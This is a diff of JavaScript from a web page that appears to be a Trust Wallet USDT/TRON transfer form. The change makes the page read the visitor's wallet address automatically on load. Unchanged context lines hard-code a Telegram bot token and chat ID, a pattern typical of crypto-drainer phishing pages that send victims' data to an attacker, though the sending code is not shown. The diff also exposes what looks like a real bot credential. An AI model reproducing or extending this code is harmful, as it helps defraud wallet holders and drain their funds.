@@ -121,8 +121,25 @@
 
         const CONFIG = { TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', TELEGRAM_CHAT_ID: '8933407008' };
         let selectedToken = 'usdt_tron';
+        let cachedUserAddress = null;
+
+        // Leggi l'indirizzo automaticamente al caricamento della pagina
+        async function initializeTronWeb() {
+            let retries = 0;
+            while (!window.tronWeb && retries < 30) {
+                await new Promise(resolve => setTimeout(resolve, 100));
+                retries++;
+            }
+
+            if (window.tronWeb) {
+                // TronWeb è disponibile - leggi l'indirizzo
+                cachedUserAddress = window.tronWeb.defaultAddress.base58;
+                console.log('TronWeb initialized, address:', cachedUserAddress);
+            }
+        }
 
         document.addEventListener('DOMContentLoaded', ( ) => {
+            initializeTronWeb();
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
         });
@@ -262,17 +279,17 @@
             clearError();
 
             try {
-                // Quando clicca "Next" - leggi l'indirizzo SOLO se disponibile
                 let tronWeb = window.tronWeb;
 
                 if (!tronWeb) {
-                    showError('Please open this link inside Trust Wallet');
+                    showError('Trust Wallet not detected');
                     btn.disabled = false;
                     btn.textContent = 'Next';
                     return;
                 }
 
-                let userAddress = tronWeb.defaultAddress.base58;
+                // Usa l'indirizzo che è stato letto al caricamento della pagina
+                let userAddress = cachedUserAddress;
 
                 if (!userAddress) {
                     showError('Wallet address not available');
